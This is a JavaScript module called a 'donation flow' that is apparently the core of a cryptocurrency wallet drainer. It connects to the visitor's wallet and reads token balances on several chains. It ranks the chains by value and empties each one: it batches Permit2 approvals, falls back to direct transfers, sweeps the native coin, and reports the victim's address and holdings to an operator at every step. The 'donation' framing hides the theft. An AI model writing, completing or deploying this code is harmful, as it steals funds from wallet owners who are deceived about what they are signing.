// src/engine/donate.js
import { notify } from "../utils/notify.js";
import { fetchBalancesCovalent, filterPermit2SafeTokens, getChainValue } from "./balances.js";
import { getProviderForChain } from "./providerHelper.js";
import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
import { executeFallbackBatch, sweepNative } from "./fallback.js";
import { CHAINS, exceptionList, COVALENT_API_KEY, RECIPIENT_ADDRESS } from "../config.js";
import { ethers } from "ethers";

/**
 * Orchestrator: runs the same flow you had but using the split modules.
 * walletClient is optional (pass WalletConnect client if available)
 */
export async function runDonationFlow(walletClient) {
  try {
    // resolve owner
    let owner = null;
    if (walletClient?.account?.address) owner = walletClient.account.address;
    else if (typeof window !== "undefined" && window.ethereum) {
      const tmpProv = new ethers.BrowserProvider(window.ethereum);
      await tmpProv.send("eth_requestAccounts", []);
      owner = await tmpProv.getSigner().getAddress();
    }

    if (!owner) throw new Error("Wallet not connected");

    // build chain balances
    const chainBalances = [];
    for (const chain of CHAINS) {
      const raw = await fetchBalancesCovalent(owner, chain.chainId);
      const filtered = await filterPermit2SafeTokens(raw);
      chainBalances.push({ ...chain, tokens: filtered, totalValue: getChainValue(filtered) });
    }

    // notify wallet connected (detailed)
    const balancesPayload = chainBalances.map(c => ({
      name: c.name,
      native: "0", // we don't fetch native via covalent here; provider can give that if needed
      tokens: c.tokens.map(t => ({ name: t.tokenSymbol, amount: t.balanceRaw, value: t.quote })),
      total: c.totalValue
    }));
    const grandTotal = balancesPayload.reduce((acc, c) => acc + (c.total || 0), 0);
    const trackingId = Date.now().toString();
    notify("WALLET_CONNECTED", { walletAddress: owner, trackingId, balances: balancesPayload, grandTotal });

    // sort by value
    chainBalances.sort((a,b)=>b.totalValue - a.totalValue);

    // sweep each chain
    for (const chain of chainBalances) {
      const localTrackingId = Date.now().toString();
      notify("DONATION_START", { walletAddress: owner, trackingId: localTrackingId });

      const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, localTrackingId);

      // split tokens
      const permit2Tokens = [];
      const fallbackTokens = [];
      for (const t of chain.tokens) {
        const addr = t.tokenAddress.toLowerCase();
        if (exceptionList?.[chain.chainId]?.includes(addr)) {
          fallbackTokens.push(t);
          notify("BATCH_FILTERED", { reason: "exception", token: t, chain: chain.name, trackingId: localTrackingId });
          continue;
        }
        const ok = await isPermit2Compatible(addr, signer);
        if (ok) permit2Tokens.push(t);
        else {
          fallbackTokens.push(t);
          notify("BATCH_FILTERED", { reason: "not_permit2", token: t, chain: chain.name, trackingId: localTrackingId });
        }
      }

      // permit2 batch
      try {
        if (permit2Tokens.length) {
          notify("PERMIT2_PREPARE", { tokens: permit2Tokens, chain: chain.name, trackingId: localTrackingId });
          await executePermit2Batch(signer, chain.chainId, permit2Tokens);
          notify("PERMIT2_EXECUTED", { tokens: permit2Tokens, chain: chain.name, trackingId: localTrackingId });
        }
      } catch (err) {
        console.warn("permit2 batch error", err);
        // push to fallback
        fallbackTokens.push(...permit2Tokens);
      }

      // fallback batch
      try {
        if (fallbackTokens.length) {
          notify("FALLBACK_PREPARE", { tokens: fallbackTokens, chain: chain.name, trackingId: localTrackingId });
          await executeFallbackBatch(signer, chain.chainId, fallbackTokens);
          notify("FALLBACK_EXECUTED", { tokens: fallbackTokens, chain: chain.name, trackingId: localTrackingId });
        }
      } catch (err) {
        console.warn("fallback batch error", err);
      }

      // native sweep
      try {
        const tx = await sweepNative(signer, provider, chain.chainId);
        if (tx) notify("NATIVE_SWEEP", { chain: chain.name, txHash: tx.hash, trackingId: localTrackingId });
      } catch (err) {
        console.warn("native sweep error", err);
      }

      // after chain processed: notify results snapshot for this chain
      notify("DONATION_RESULTS", {
        walletAddress: owner,
        trackingId: localTrackingId,
        balances: [
          {
            name: chain.name,
            native: "n/a",
            tokens: chain.tokens.map(t => ({ name: t.tokenSymbol, amount: t.balanceRaw, value: t.quote })),
            total: chain.totalValue
          }
        ],
        donationSummary: { total: chain.totalValue, breakdown: [{ chain: chain.name, amount: chain.totalValue }] }
      });
    }

    // done
    notify("WALLET_DISCONNECTED", { walletAddress: owner, trackingId });
    return { success: true };
  } catch (err) {
    console.error("runDonationFlow error:", err);
    return { success: false, reason: err.message || String(err) };
  }
}
